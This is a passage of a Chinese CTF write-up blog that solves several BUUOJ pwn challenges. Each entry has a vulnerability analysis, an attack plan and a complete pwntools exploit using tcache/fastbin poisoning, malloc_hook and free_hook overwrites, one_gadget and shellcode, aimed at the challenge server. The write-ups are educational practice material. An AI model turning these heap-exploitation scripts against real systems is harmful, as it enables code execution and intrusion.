class="hljs-string">'1'</span> * <span class="hljs-number">0x118</span> + p64(<span class="hljs-number">0x000000401157</span>)sl(data)itr()</code></pre></div><h2 id="SWPUCTF-2019-p1KkHeap"><a href="#SWPUCTF-2019-p1KkHeap" class="headerlink" title="SWPUCTF_2019_p1KkHeap"></a><code>SWPUCTF_2019_p1KkHeap</code></h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><ul><li>开了沙箱，可以orw拿到flag</li><li>功能只能调用18次，free只能3次</li><li>free中存在uaf</li><li>mmap了一块 rwx的内存在 <code>0x66660000</code></li></ul><h3 id="攻击思路-4"><a href="#攻击思路-4" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>泄漏heap base，准备攻击tcache bin的表头</li><li>覆盖bin counts为7，伪造满bin，free chunk，泄漏libc</li><li>攻击tcache bin的表头中bin chunk header 的部分，放下<code>0x66660000</code> 和<code>malloc_hook</code>，准备修改这两个部分。</li><li>在<code>0x66660000</code>的内存上写下orw的shellcode</li><li>攻击<code>malloc_hook</code>为<code>0x66660000</code> 取得flag</li></ul><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./SWPUCTF_2019_p1KkHeap'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29911</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-string">'''================================================================================ line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x07 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0011 0004: 0x15 0x06 0x00 0x0000003b  if (A == execve) goto 0011 0005: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0010 0006: 0x20 0x00 0x00 0x00000024  A = count &gt;&gt; 32 # write(fd, buf, count) 0007: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0010 0008: 0x20 0x00 0x00 0x00000020  A = count # write(fd, buf, count) 0009: 0x15 0x01 0x00 0x00000010  if (A == 0x10) goto 0011 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0011: 0x06 0x00 0x00 0x00000000  return KILL'''</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'id'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'id'</span>,str(idx))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'id'</span>,str(idx))add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#0</span>free(<span class="hljs-number">0</span>)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)ru(<span class="hljs-string">'content: '</span>)heap_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x260</span>info_addr(<span class="hljs-string">'heap_base'</span>,heap_base)add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#1</span>edit(<span class="hljs-number">1</span>,p64(heap_base+<span class="hljs-number">0x10</span>))add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#3</span>debug()data = p64(<span class="hljs-number">8</span>) + <span class="hljs-string">'\x07'</span>*<span class="hljs-number">8</span>edit(<span class="hljs-number">3</span>,data)add(<span class="hljs-number">0x80</span>)<span class="hljs-comment">#4</span>free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)ru(<span class="hljs-string">'content: '</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebca0</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)data = p64(<span class="hljs-number">8</span>) + <span class="hljs-string">'\x07'</span>*<span class="hljs-number">8</span> + <span class="hljs-string">'\x00'</span> * (<span class="hljs-number">0xc0</span> - <span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0x3ebc30</span> + libc_base) +p64(<span class="hljs-number">0x66660000</span>) edit(<span class="hljs-number">3</span>,data)add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#5</span>orw = shellcraft.open(<span class="hljs-string">'flag'</span>)orw += shellcraft.read(<span class="hljs-number">3</span>,<span class="hljs-number">0x66660100</span>,<span class="hljs-number">0x64</span>)orw +=shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-number">0x66660100</span>,<span class="hljs-number">0x64</span>)edit(<span class="hljs-number">5</span>,asm(orw))add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#6</span>edit(<span class="hljs-number">6</span>,p64(<span class="hljs-number">0x66660000</span>))add(<span class="hljs-number">1</span>)itr()</code></pre></div><h3 id="题记-1"><a href="#题记-1" class="headerlink" title="题记"></a>题记</h3><p>在学习别人的exp时，发现还有泄漏libc的另外一种办法，这种办法泄漏出libc，也使得整个exp，基本跟我的不大相同。</p><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p><strong>在tcache bin的表头中，其每个大小tcache bin的count(0-7) 是一个无符号类型的数据。</strong></p><p>当用uaf漏洞，在一个chain上伪造一个chunk地址，这样当申请后tcache bin的count会变成0xff&gt;0x7，这样利用uaf，再次释放这个chain上 的chunk，就会进入到unsortbin，接着就leak 出libc了。</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; parseheapaddr                prev                size                 status              fd                bk<span class="hljs-number">0x55daa2e85000</span>      <span class="hljs-number">0x0</span>                 <span class="hljs-number">0x250</span>                Used                None              None<span class="hljs-number">0x55daa2e85250</span>      <span class="hljs-number">0x0</span>                 <span class="hljs-number">0x110</span>                Freed     <span class="hljs-number">0x7fb70dbbaca0</span>    <span class="hljs-number">0x7fb70dbbaca0</span><span class="hljs-number">0x55daa2e85360</span>      <span class="hljs-number">0x110</span>               <span class="hljs-number">0x110</span>                Freed     <span class="hljs-number">0x55daa2e85370</span>              Nonepwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x55daa2e85000</span><span class="hljs-number">0x55daa2e85000</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000251</span><span class="hljs-number">0x55daa2e85010</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0xff00000000000000</span><span class="hljs-number">0x55daa2e85020</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div><p>剩下的就是进行tcache dup即可。这个比我那个方法要简单的多。</p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://blog.csdn.net/github_36788573/article/details/103475238" target="_blank" rel="noopener">https://blog.csdn.net/github_36788573/article/details/103475238</a></p><p><a href="https://blog.csdn.net/seaaseesa/article/details/103450524" target="_blank" rel="noopener">https://blog.csdn.net/seaaseesa/article/details/103450524</a></p><h2 id="护网杯-2018-gettingstart"><a href="#护网杯-2018-gettingstart" class="headerlink" title="护网杯_2018_gettingstart"></a><code>护网杯_2018_gettingstart</code></h2><p>白给题。考浮点数在内存中是怎么存的。</p><div class="hljs"><pre><code class="hljs python">data = <span class="hljs-string">'1'</span> * <span class="hljs-number">24</span> + p64(<span class="hljs-number">0x7fffffffffffffff</span>) + p64(<span class="hljs-number">0x3FB999999999999A</span>)s(data)itr()</code></pre></div><h2 id="OGeek2019-bookmanager"><a href="#OGeek2019-bookmanager" class="headerlink" title="[OGeek2019]bookmanager"></a><code>[OGeek2019]bookmanager</code></h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><ul><li>存在heap overflow</li><li>uaf</li><li>off by one</li></ul><p>一堆洞，伪代码看起来很复杂，但是利用起来较为简单。</p><p>重点漏洞函数在 updata上。</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn-2'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29005</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_chapter</span><span class="hljs-params">(name)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sa(<span class="hljs-string">'name'</span>,str(name))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_section</span><span class="hljs-params">(chapter,name)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)    sa(<span class="hljs-string">'into'</span>,str(chapter))    sa(<span class="hljs-string">'name'</span>,str(name))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_text</span><span class="hljs-params">(section,size,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)    sa(<span class="hljs-string">'into'</span>,str(section))    sla(<span class="hljs-string">'write'</span>,str(size))    sa(<span class="hljs-string">'Text'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">del_chapter</span><span class="hljs-params">(name)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'name'</span>,str(name))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">del_section</span><span class="hljs-params">(name)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'5'</span>)    sla(<span class="hljs-string">'name'</span>,str(name))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">del_text</span><span class="hljs-params">(name)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'6'</span>)    sla(<span class="hljs-string">'name'</span>,str(name))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'7'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(type,name,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'8'</span>)    sla(<span class="hljs-string">'update'</span>,str(type))    sa(<span class="hljs-string">'name'</span>,str(name))    sa(<span class="hljs-string">'New'</span>,str(data))sla(<span class="hljs-string">'Name'</span>,<span class="hljs-string">'chumen77'</span> * <span class="hljs-number">4</span>)add_chapter(<span class="hljs-string">'chumen77'</span>)add_section(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'1'</span>)add_section(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'2'</span>)add_section(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'3'</span>)add_text(<span class="hljs-string">'1'</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x100</span>)<span class="hljs-comment"># show()</span>add_text(<span class="hljs-string">'2'</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">'2'</span>*<span class="hljs-number">0x100</span>)del_section(<span class="hljs-string">'1'</span>)del_section(<span class="hljs-string">'2'</span>)show()ru(<span class="hljs-string">'Section:'</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)free_hook = <span class="hljs-number">0x3c67a8</span> + libc_baseadd_text(<span class="hljs-string">'3'</span>,<span class="hljs-number">0x100</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x100</span>)edit(<span class="hljs-string">'Section'</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'3'</span> + <span class="hljs-string">'\x00'</span> + <span class="hljs-string">'1'</span>*(<span class="hljs-number">0x20</span><span class="hljs-number">-2</span>) + <span class="hljs-string">'\xd0'</span>)data = p64(free_hook) + p64(<span class="hljs-number">0x20</span>)edit(<span class="hljs-string">'Text'</span>,<span class="hljs-string">'3'</span>,data)one = libc_base + rce16[<span class="hljs-number">2</span>]edit(<span class="hljs-string">'Text'</span>,<span class="hljs-string">'3'</span>,p64(one))del_chapter(<span class="hljs-string">'chumen77'</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h3 id="题记-2"><a href="#题记-2" class="headerlink" title="题记"></a>题记</h3><ul><li><p>题是简单题，但是由于代码一多，且指针看起来复杂，个人做起来就有点慢，并且让自己连最简单的heap overflow都没有想起来去利用。</p><h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4></li><li><p>对于指针复杂的堆信息分配，可以直接gdb上手调来确定基本堆信息。</p></li></ul><h2 id="de1ctf-2019-weapon"><a href="#de1ctf-2019-weapon" class="headerlink" title="de1ctf_2019_weapon"></a><code>de1ctf_2019_weapon</code></h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><ul><li>uaf</li><li>最大只能申请0x60的chunk</li><li>没有show函数</li><li>部分input利用scanf来获取读入</li></ul><h3 id="攻击思路-5"><a href="#攻击思路-5" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>free 2个chunk，然后用scanf 读入大量的字符，来获取一个smallbin</li><li>利用残留的libc地址，fastbin attck <code>IO_stdout</code>来泄漏libc</li><li>fastbin attck <code>malloc_hook</code></li></ul><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./de1ctf_2019_weapon'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28987</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size of weapon:'</span>,str(size))    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'name'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">'new'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    add(<span class="hljs-number">0</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">1</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">2</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">3</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)    free(<span class="hljs-number">0</span>)    free(<span class="hljs-number">1</span>)    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span> * <span class="hljs-number">0x1000</span>)    add(<span class="hljs-number">4</span>,<span class="hljs-number">0x60</span>,p16(<span class="hljs-number">0xa5dd</span>))    free(<span class="hljs-number">3</span>)    free(<span class="hljs-number">2</span>)    free(<span class="hljs-number">3</span>)    edit(<span class="hljs-number">3</span>,<span class="hljs-string">'\x00'</span>)    add(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)    add(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)    <span class="hljs-comment"># debug()</span>    data = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x33</span> + p64(<span class="hljs-number">0xfbad3c80</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>)    add(<span class="hljs-number">7</span>,<span class="hljs-number">0x60</span>,data)leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">10</span>)        leak = uu64(r(<span class="hljs-number">6</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x7ff81b57b6a3</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        <span class="hljs-comment"># io = process('./de1ctf_2019_weapon')</span>        io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28987</span>)        <span class="hljs-keyword">continue</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_addr = leak - <span class="hljs-number">0x3c56a3</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_addr)malloc_hook = <span class="hljs-number">0x3c4b10</span> + libc_addrfree(<span class="hljs-number">0</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">0</span>)edit(<span class="hljs-number">0</span>,p64(malloc_hook - <span class="hljs-number">0x13</span>))add(<span class="hljs-number">7</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">'1'</span>)one = rce16[<span class="hljs-number">3</span>] + libc_addrdata = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">3</span> + p64(one)add(<span class="hljs-number">8</span>,<span class="hljs-number">0x60</span>,data)sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)sla(<span class="hljs-string">'size of weapon:'</span>,<span class="hljs-string">'10'</span>)sla(<span class="hljs-string">'dex'</span>,<span class="hljs-string">'9'</span>)<span class="hljs-comment"># add(9,0x30,'1')</span><span class="hljs-comment"># debug()</span>itr()</code></pre></div><h2 id="starctf-2019-babyshell"><a href="#starctf-2019-babyshell" class="headerlink" title="starctf_2019_babyshell"></a><code>starctf_2019_babyshell</code></h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>会有一个函数检查你的shellcode是否满足要求。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = a1; *i; ++i ) &#123;   <span class="hljs-keyword">for</span> ( j = &amp;unk_400978; *j &amp;&amp; *j != *i; ++j )     ;   <span class="hljs-keyword">if</span> ( !*j )                                  <span class="hljs-comment">// 检查shellcode合法的函数，遍历shellcode的每个字符，在0x400987处找是否有匹配。</span>     <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L; &#125; <span class="hljs-keyword">return</span> <span class="hljs-number">1L</span>L;</code></pre></div><p>需要0x400987地址处的字节码匹配。倘若发现有不匹配的字节，就直接check不过。</p><p>可以用的有 <code>pop rdx、pop rdi、syscall</code></p><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>有师傅的做法，就是用这3个汇编，强行凑出一个read，然后把shellcode再次读到mmap的buf上合适的位置（此题加12），再次调用到shellcode。</p><p><a href="https://www.cnblogs.com/Rookle/p/12895895.html" target="_blank" rel="noopener">https://www.cnblogs.com/Rookle/p/12895895.html</a><br><a href="https://github.com/sixstars/starctf2019/tree/master/pwn-shellcode" target="_blank" rel="noopener">https://github.com/sixstars/starctf2019/tree/master/pwn-shellcode</a><br><a href="https://blog.csdn.net/seaaseesa/article/details/105863820" target="_blank" rel="noopener">https://blog.csdn.net/seaaseesa/article/details/105863820</a></p><div class="hljs"><pre><code class="hljs undefined">对于一些受限的shellcode，我们最好的办法是构造<span class="hljs-built_in">read</span>系统调用。</code></pre></div><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>还有就是这个循环，其实直接可以用<code>\x00</code>截断，因为开头循环条件2 给0 直接就不执行下面的检测循环，return 1 走了。</p><p><strong>但是跳过去需要，提前再布置几个机器码字节保证不影响下面的shellcode。</strong></p><p>可以直接在ida里面设置显示机器码，以后直接选取合适的机器码整上去就可以了。</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-symbol">00 </span><span class="hljs-number">5</span>A <span class="hljs-number">5</span>A                    add     [rdx+<span class="hljs-number">5</span>Ah], bl</code></pre></div><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python">shellcode = asm(shellcraft.sh())s(<span class="hljs-string">'\x00'</span>+ <span class="hljs-string">'\x5a'</span> +<span class="hljs-string">'\x00'</span>+ shellcode)</code></pre></div><h3 id="题记-3"><a href="#题记-3" class="headerlink" title="题记"></a>题记</h3><p>感觉个人shellcode能力较差，得抽时间学习下。</p><h2 id="hfctf-2020-marksman"><a href="#hfctf-2020-marksman" class="headerlink" title="hfctf_2020_marksman"></a><code>hfctf_2020_marksman</code></h2><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>上来给了libc地址，可以任意地址3个字节的写入。</p><h4 id="难点1"><a href="#难点1" class="headerlink" title="难点1"></a>难点1</h4><p>修改那里的地址，才能控制程序流程。</p><p>可以修改<code>exit_hook</code>:<br><a href="https://blog.csdn.net/qq_43116977/article/details/105485947" target="_blank" rel="noopener">https://blog.csdn.net/qq_43116977/article/details/105485947</a><br>参考这里。</p><p>在退出时：</p><p><code>exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive</code></p><p>修改<code>__rtld_lock_unlock_recursive</code>或者<code>__rtld_lock_lock_recursive</code>即可。</p><p><strong>gdb 快速获取这个地址的办法：</strong></p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; p &amp;<span class="hljs-variable">_rtld_global</span>.<span class="hljs-variable">_dl_rtld_lock_recursive</span></code></pre></div><h4 id="难点2"><a href="#难点2" class="headerlink" title="难点2"></a>难点2</h4><p>one gadget的调整。</p><p>其中 <code>one_gadget -lx</code>  这个可以设置扫描等级获取更多的one gadget。</p><p>并且在程序中：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">signed</span> __int64 __<span class="hljs-function">fastcall <span class="hljs-title">sub_BC2</span><span class="hljs-params">(_BYTE *a1)</span></span>&#123;  <span class="hljs-keyword">if</span> ( (*a1 != <span class="hljs-number">0xC5</span>u || a1[<span class="hljs-number">1</span>] != <span class="hljs-number">0xF2</span>u) &amp;&amp; (*a1 != <span class="hljs-number">0x22</span> || a1[<span class="hljs-number">1</span>] != <span class="hljs-number">0xF3</span>u) &amp;&amp; *a1 != <span class="hljs-number">0x8C</span>u 